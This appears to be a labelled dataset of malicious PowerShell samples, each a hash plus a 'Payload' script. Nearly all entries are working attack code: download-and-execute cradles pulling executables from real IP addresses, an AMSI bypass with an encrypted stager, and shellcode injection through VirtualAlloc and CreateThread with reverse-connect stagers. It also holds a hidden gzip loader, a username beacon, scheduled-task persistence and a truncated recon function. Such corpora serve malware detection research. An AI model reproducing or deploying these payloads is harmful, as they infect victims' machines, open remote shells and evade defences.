$trigger.StartBoundary = $TaskStartTime.ToString(""yyyy-MM-dd'T'HH:mm:ss"")
$trigger.Enabled = $true
$trigger.Repetition.Interval = ""PT5M""
$TaskDefinition.Settings.DisallowStartIfOnBatteries = $true
$Action = $TaskDefinition.Actions.Create(0)
$action.Path = ""$TaskCommand""
$action.Arguments = ""$TaskArg""
$rootFolder.RegisterTaskDefinition(""$TaskName"",$TaskDefinition,6,""System"",$null,5)
SCHTASKS /run /TN $TaskName

",Payload
3a54741c90ebc9408d2fc2e8f6028582a7b7bf2b08458884410317695e5ed6f5,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADcgi1gCA71WbW/iOBD+3JX2P0QrpCRaSoDS7bbSSucQwkuBQlNCgUUnN3GCwcRp4lBgb//7TYD05bo99fbDRaDYnhnP+JlnPPGSwBGUB5LHx0ZpfrauST8+fjjq4QgvJSXHyhtm5KUcjfv1L+rREYhy86/X0jdJmaAwNPgS02B6cVFNoogEYj8v1IlAcUyWd4ySWFGlv6ThjETk+OpuThwh/ZByfxbqjN9hdlDbVLEzI9IxCtxU1uYOToMqWCGjQpG/f5fVyXFpWqjdJ5jFimxtYkGWBZcxWZV+qqnDm01IFLlDnYjH3BOFIQ1OyoVBEGOPdGG3FekQMeNuLKtwCPhFRCRRIKXHSe33UkWGYS/iDnLdiMSgXGgGK74gSi5IGMtLfyiTg/PrJBB0SUAuSMRDi0Qr6pC40MCBy8g18aZKlzxkZ36vkfLcCLR6IlLzkIjXUXa4mzCyN5TV13Huc6fC85g/OPnPjx8+fvCypG/9kC8Me/s85zA6muzGBGJUejymO91vUjEvdcAdFjzawDR3EyVEnUqTFPrJdCrllqulMaPb/NtblDJ90I7N5PQU1iY2p+4UbA6JyYnzjpNcna/6o5taKn+baAbxaECMTYCX1Mm4pPwKd+IxsjtzIVPrQnSKfBAQ1yCM+FikUOalyWuz2pKKR1s9ocwlEXIgdzFEBWlVXwazz44iN4MOWQJe+7kMqfCAwSTTPrB2k3lP56AkVxmO47zUS6CEnLxkEcyIm5dQENODCCWC74byU7idhAnq4Fhk203Vf+J58FvlQSyixIFUAgY3VkgcilkKSV5qUJfoG4v6mX/5l4BUMWM08GGnFSQEVlIgLJESJIJQMzKoBYuI5jJkZAlqu7I2GfahiA+1sCMV9okrvxVsRvo9w1N4MlyehQo5txgXecmmkYBbIoV6x7DfDuXZHfEiqGpEDplSsoKa6BuRlkAupPdnnRZtLFspcQ+g7SCKBMBjRnyp45h8qVgiAvCUT9oVrSJ4Rs2AdRx9QUvogZaaHfgP6EmTG2fuZWve0CJjPfNQM252Gj2j32hUVi3Lrgir1hSXvabo1G7ncws1rgcjMW6ixg0tLkaVbdiiW6uN3NFa+7LVtw9Ffb2d+643MjzPP/Os69KpSdvDal8vlnHbqCXtof6gFytxjT40+nTQX7RMcTeyGR54mn9bOsd03Y7mdol3tk2E6rMTZ9vy7Pqs425GDe18WFmgGkLVoGabOr8c6RHqaTb2bf5w6ev60K8i3XQoGfcHpt7vmzoa1Of3xrnmg+0tnulDu0zH4e31DOYmhHCpFStNl2z5qA8g1TnC/jXo+NWyM/NAx/iM9M9dHpfxQudIBx1zfA9xjUKzx0B+MyhzZLPuLUbt8cbUtNKoV0GNIh3WfZRuiX29j1G8MraGVrJd7g5PuyNPs2/ZmWZUb0LH0zTtoWFcOuPS+uvV2df2kNpLjgaaZn9KWQI0ya3um1av264hZxA8y/tbl30HR/EMM+ADXONZqZo8Mg/Xco/T1EJRnnrygkQBYdDQoOVlDEeMcSdtDo+3ODSnfcuYQsUOYHhS/uVIlR4V1afOkS1dXIwhXCibJzIX2iTwxSxfXJ8Ui9AGiutKEQ7//oNWebhRnm2YT5vJC9xe+mM7f2paW7m4fxb+D6geynoGL/c9qD6t/Yv0XUgX8y+ReCV+ufCfgP89LIaYClC34IpiZN9J34bkwKlnnyBpxoAr3uFJPwCvEnHchS+TvwEIY7tPcAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
91f3fad14540791af6494356795f8bb853bacf05d39f992f919c16962303003f,"
[ReF].ASSEmbly.GetTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIElD('amsiInitFailed','NonPublic,Static').SetVAlue($Null,$True)};[SySteM.Net.SErviCEPOINTMaNAger]::ExPeCt100ConTinue=0;$wC=NEW-OBjEcT System.NET.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERs.ADD('User-Agent',$u);$wC.PRoxY=[SYStEm.NET.WEBREQuEst]::DeFaUlTWEbProXY;$Wc.ProXY.CREDenTIALs = [SYSteM.NEt.CReDentIalCAcHe]::DeFAulTNetwORKCREdEntialS;$K=[SySTEm.TexT.EncodING]::ASCII.GETBYteS('Dv,inKZ<@{3mjG4&1k:Vcl7o)EY*J?6x');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bxor$S[($S[$I]+$S[$H])%256]}};$Wc.HEaDERs.ADD(""Cookie"",""session=Pu8sEnIpxIwINbUOVsxlL66DoHA="");$ser='http://35.165.38.15:80';$t='/login/process.php';$dATa=$WC.DowNLOadDAtA($ser+$T);$IV=$DaTA[0..3];$Data=$DaTa[4..$DAtA.leNgTH];-JoIn[CHAr[]](& $R $data ($IV+$K))|IEX

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c42363b9ac47e3945c4238787fbf8633dc1cced4a277ff7f106ecff3cbec7501,"
$Q4l = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Q4l -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdd,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xba,0x21,0x78,0xf4,0xc5,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xc6,0x25,0x9a,0x01,0x39,0xcd,0xd8,0xea,0xc2,0x0d,0xbd,0x63,0x27,0x3c,0xfd,0x10,0x23,0x6e,0xcd,0x53,0x61,0x82,0xa6,0x36,0x92,0x11,0xca,0x9e,0x95,0x92,0x61,0xf9,0x98,0x23,0xd9,0x39,0xba,0xa7,0x20,0x6e,0x1c,0x96,0xea,0x63,0x5d,0xdf,0x17,0x89,0x0f,0x88,0x5c,0x3c,0xa0,0xbd,0x29,0xfd,0x4b,0x8d,0xbc,0x85,0xa8,0x45,0xbe,0xa4,0x7e,0xde,0x99,0x66,0x80,0x33,0x92,0x2e,0x9a,0x50,0x9f,0xf9,0x11,0xa2,0x6b,0xf8,0xf3,0xfb,0x94,0x57,0x3a,0x34,0x67,0xa9,0x7a,0xf2,0x98,0xdc,0x72,0x01,0x24,0xe7,0x40,0x78,0xf2,0x62,0x53,0xda,0x71,0xd4,0xbf,0xdb,0x56,0x83,0x34,0xd7,0x13,0xc7,0x13,0xfb,0xa2,0x04,0x28,0x07,0x2e,0xab,0xff,0x8e,0x74,0x88,0xdb,0xcb,0x2f,0xb1,0x7a,0xb1,0x9e,0xce,0x9d,0x1a,0x7e,0x6b,0xd5,0xb6,0x6b,0x06,0xb4,0xde,0x58,0x2b,0x47,0x1e,0xf7,0x3c,0x34,0x2c,0x58,0x97,0xd2,0x1c,0x11,0x31,0x24,0x63,0x08,0x85,0xba,0x9a,0xb3,0xf6,0x93,0x58,0xe7,0xa6,0x8b,0x49,0x88,0x2c,0x4c,0x76,0x5d,0xd8,0x49,0xe0,0x9e,0xb5,0x53,0x86,0x76,0xc4,0x53,0x77,0xdb,0x41,0xb5,0x27,0xb3,0x01,0x6a,0x87,0x63,0xe2,0xda,0x6f,0x6e,0xed,0x05,0x8f,0x91,0x27,0x2e,0x25,0x7e,0x9e,0x06,0xd1,0xe7,0xbb,0xdd,0x40,0xe7,0x11,0x98,0x42,0x63,0x96,0x5c,0x0c,0x84,0xd3,0x4e,0xf8,0x64,0xae,0x2d,0xae,0x7b,0x04,0x5b,0x4e,0xee,0xa3,0xca,0x19,0x86,0xa9,0x2b,0x6d,0x09,0x51,0x1e,0xe6,0x80,0xc7,0xe1,0x90,0xec,0x07,0xe2,0x60,0xbb,0x4d,0xe2,0x08,0x1b,0x36,0xb1,0x2d,0x64,0xe3,0xa5,0xfe,0xf1,0x0c,0x9c,0x53,0x51,0x65,0x22,0x8a,0x95,0x2a,0xdd,0xf9,0x27,0x16,0x08,0xc7,0x5d,0x76,0x88;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$gs8M=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($gs8M.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$gs8M,0,0,0);for (;;){Start-sleep 60};

",Payload
5a6fa035e7c07ab038fa3928176a99a72aec3671e8024dc0cd1d4d8504d35fa5,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/qolcls.exe',""$env:TEMP\puttyx86.exe"");Start-Process (""$env:TEMP\puttyx86.exe"")

",Payload
445a4e81ad763a4fa2ed1f6744b2028358ff8d70945433659a9bcad5dc0cb640,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
53974967c18c4c4f0a6948c389aaa35f2d5c327d7ee7371bd27a4c4494c350dc,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~yahoo/stchost.exe', $env:APPDATA\stchost.exe );Start-Process ( $env:APPDATA\stchost.exe )

",Payload
52adcbd4df6e860ca279cb0bc180cb3d67cf5f4c88de42a3569f16615919f865,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb0,0xe4,0x29,0x71,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
e2d199a8c4e112341c14289204641f20285fab7f117c9b7f5b0eabd667287663,"
$ypwg = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ypwg -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd8,0xbf,0xa2,0x5e,0x51,0xf8,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x7d,0x18,0x03,0x7d,0x18,0x83,0xed,0x5e,0xbc,0xa4,0x04,0x76,0xc3,0x47,0xf5,0x86,0xa4,0xce,0x10,0xb7,0xe4,0xb5,0x51,0xe7,0xd4,0xbe,0x34,0x0b,0x9e,0x93,0xac,0x98,0xd2,0x3b,0xc2,0x29,0x58,0x1a,0xed,0xaa,0xf1,0x5e,0x6c,0x28,0x08,0xb3,0x4e,0x11,0xc3,0xc6,0x8f,0x56,0x3e,0x2a,0xdd,0x0f,0x34,0x99,0xf2,0x24,0x00,0x22,0x78,0x76,0x84,0x22,0x9d,0xce,0xa7,0x03,0x30,0x45,0xfe,0x83,0xb2,0x8a,0x8a,0x8d,0xac,0xcf,0xb7,0x44,0x46,0x3b,0x43,0x57,0x8e,0x72,0xac,0xf4,0xef,0xbb,0x5f,0x04,0x37,0x7b,0x80,0x73,0x41,0x78,0x3d,0x84,0x96,0x03,0x99,0x01,0x0d,0xa3,0x6a,0xb1,0xe9,0x52,0xbe,0x24,0x79,0x58,0x0b,0x22,0x25,0x7c,0x8a,0xe7,0x5d,0x78,0x07,0x06,0xb2,0x09,0x53,0x2d,0x16,0x52,0x07,0x4c,0x0f,0x3e,0xe6,0x71,0x4f,0xe1,0x57,0xd4,0x1b,0x0f,0x83,0x65,0x46,0x47,0x60,0x44,0x79,0x97,0xee,0xdf,0x0a,0xa5,0xb1,0x4b,0x85,0x85,0x3a,0x52,0x52,0xea,0x10,0x22,0xcc,0x15,0x9b,0x53,0xc4,0xd1,0xcf,0x03,0x7e,0xf0,0x6f,0xc8,0x7e,0xfd,0xa5,0x65,0x7a,0x69,0xec,0x7a,0x91,0xa2,0x98,0x78,0x99,0x25,0x05,0xf4,0x7f,0x15,0xe5,0x56,0xd0,0xd5,0x55,0x17,0x80,0xbd,0xbf,0x98,0xff,0xdd,0xbf,0x72,0x68,0x77,0x50,0x2b,0xc0,0xef,0xc9,0x76,0x9a,0x8e,0x16,0xad,0xe6,0x90,0x9d,0x42,0x16,0x5e,0x56,0x2e,0x04,0x36,0x96,0x65,0x76,0x90,0xa9,0x53,0x1d,0x1c,0x3c,0x58,0xb4,0x4b,0xa8,0x62,0xe1,0xbb,0x77,0x9c,0xc4,0xb0,0xbe,0x08,0xa7,0xae,0xbe,0xdc,0x27,0x2e,0xe9,0xb6,0x27,0x46,0x4d,0xe3,0x7b,0x73,0x92,0x3e,0xe8,0x28,0x07,0xc1,0x59,0x9d,0x80,0xa9,0x67,0xf8,0xe7,0x75,0x97,0x2f,0xf6,0x4a,0x4e,0x09,0x8c,0xa2,0x52;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$VkS=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($VkS.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$VkS,0,0,0);for (;;){Start-sleep 60};

",Payload
53974967c18c4c4f0a6948c389aaa35f2d5c327d7ee7371bd27a4c4494c350dc,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~yahoo/stchost.exe', $env:APPDATA\stchost.exe );Start-Process ( $env:APPDATA\stchost.exe )

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
20f755e82b8444b24e636e955497f4e5906da7cef20362c01ed2c69bf597018c,"
[SYSteM.NET.SErviCePOInTMANaGER]::ExPECT100COntinUE = 0;$wc=New-OBJect SYstem.Net.WeBClIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadERS.Add('User-Agent',$u);$Wc.ProXY = [SystEm.Net.WEBReqUeSt]::DeFaulTWEBPROxy;$wC.PRoXy.CrEDEntiALs = [SysTem.NEt.CredENTIalCaChe]::DEFAultNETWOrKCREdEntIALS;$wC.DOwnLOadStRING(""http://212.99.114.202:443/count.php?user=""+[Environment]::UserName);exit

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
2fb27fc77617861e83a76a4366ce22acfa00f1654627d1c8ff4d97a237e93cb0,"function Invoke-ReverseDnsLookup
{


    Param (
        [Parameter(Position = 0, Mandatory = $True,ValueFromPipeline=$True)]
        [String]
        $IpRange
    )

    BEGIN {
    
        function Parse-IPList ([String] $IpRange)
        {
        
            function IPtoInt
            {
                Param([String] $IpString)
            
                $Hexstr = """"
                $Octets = $IpString.Split(""."")
                foreach ($Octet in $Octets) {
                        $Hexstr += ""{0:X2}"" -f [Int] $Octet
                }
                return [Convert]::ToInt64($Hexstr, 16)
            }
        
            function InttoIP
            {
                Param([Int64] $IpInt)
                $Hexstr = $IpInt.ToString(""X8"")
                $IpStr = """"
                for ($i=0; $i -lt 8; $i += 2) {
                        $IpStr += [Convert]::ToInt64($Hexstr.SubString($i,2), 16)
                        $IpStr += '.'
                }
                return $IpStr.TrimEnd('.')
            }
        
            $Ip = [System.Net.IPAddress]::Parse(""127.0.0.1"")
        
            foreach ($Str in $IpRange.Split("",""))
            {
                $Item = $Str.Trim()
                $Result = """"
                $IpRegex = ""\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}""
            
                
                switch -regex ($Item)
                {
                    ""^$IpRegex/\d{1,2}$""
                    {
                        $Result = ""cidrRange""
                        break
                    }
                    ""^$IpRegex-$IpRegex$""
                    {
                        $Result = ""range""
                        break
                    }
                    ""^$IpRegex$""
                    {
                        $Result = ""single""
                        break
                    }
                    default
                    {
                        Write-Warning ""Inproper input""
                        return
                    }
                }
            
                
                switch ($Result)
                {
                    ""cidrRange""
                    {
                        $CidrRange = $Item.Split(""/"")
                        $Network = $CidrRange[0]
                        $Mask = $CidrRange[1]
                    
                        if (!([System.Net.IPAddress]::TryParse($Network, [ref] $Ip))) { Write-Warning ""Invalid IP address supplied!""; return}
                        if (($Mask -lt 0) -or ($Mask -gt 30)) { Write-Warning ""Invalid network mask! Acceptable values are 0-30""; return}
                    
                        $BinaryIP = [Convert]::ToString((IPtoInt $Network),2).PadLeft(32,'0')
                        
                        $Lower = $BinaryIP.Substring(0, $Mask) + ""0"" * ((32-$Mask)-1) + ""1""
                        
                        $Upper = $BinaryIP.Substring(0, $Mask) + ""1"" * ((32-$Mask)-1) + ""0""
                        $LowerInt = [Convert]::ToInt64($Lower, 2)
                        $UpperInt = [Convert]::ToInt64($Upper, 2)
                        for ($i = $LowerInt; $i -le $UpperInt; $i++) { InttoIP $i }
                    }
                    ""range""
                    {
                        $Range = $item.Split(""-"")
                    
                        if ([System.Net.IPAddress]::TryParse($Range[0],[ref]$Ip)) { $Temp1 = $Ip }
                        else { Write-Warning ""Invalid IP address supplied!""; return }
                    
                        if ([System.Net.IPAddress]::TryParse($Range[1],[ref]$Ip)) { $Temp2 = $Ip }
